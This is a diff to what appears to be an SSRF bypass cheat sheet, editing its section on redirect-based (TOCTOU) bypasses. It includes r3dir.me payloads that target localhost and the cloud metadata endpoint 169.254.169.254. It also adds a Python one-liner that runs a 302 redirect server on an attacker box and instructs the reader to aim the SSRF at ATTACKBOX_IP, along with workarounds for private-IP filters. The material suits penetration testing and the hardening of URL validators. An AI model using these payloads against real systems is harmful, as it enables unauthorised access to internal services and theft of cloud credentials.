@@ -203,9 +203,12 @@ http:127.0.0.1/
 Different parsers resolve `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` differently:
 urllib2 → 1.1.1.1, requests → 2.2.2.2, urllib → 3.3.3.3.
 
-### HTTP Redirect Bypass
+### HTTP Redirect Bypass (TOCTOU)
 
-When the app validates the initial URL but follows redirects:
+Many URL validators check the initial URL but the underlying HTTP library
+follows 302/307 redirects without re-validating the destination. This is a
+Time-of-Check-Time-of-Use (TOCTOU) gap — point the SSRF at your server,
+which redirects to the internal target.
 
 ```
 # Using r3dir.me (no server needed)
@@ -213,10 +216,29 @@ https://307.r3dir.me/--to/?url=http://localhost
 https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
 ```
 
-Or host your own redirector:
-```php
-<?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>
+Or host a Python redirect server on the attackbox:
+```bash
+# Usage: python3 redir.py <target_url> [port]
+# Example: python3 redir.py http://127.0.0.1:9001/ 8888
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import sys
+class R(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', sys.argv[1])
+        self.end_headers()
+    def log_message(self, *a): pass
+HTTPServer(('0.0.0.0', int(sys.argv[2]) if len(sys.argv)>2 else 8888), R).serve_forever()
+" "http://127.0.0.1:PORT/path" 8888
 ```
+
+Then point the SSRF at `http://ATTACKBOX_IP:8888/anything`.
+
+**Constraint:** If your attackbox is on a private IP (10.x, 172.16-31.x,
+192.168.x) and the validator also blocks private IPs in the initial URL,
+the redirect server won't be reachable. Workarounds: use r3dir.me (public
+IP), use DNS rebinding (below), or check if the validator ignores IPv6.
 
 Use HTTP 307/308 to preserve the original HTTP method and body.
 
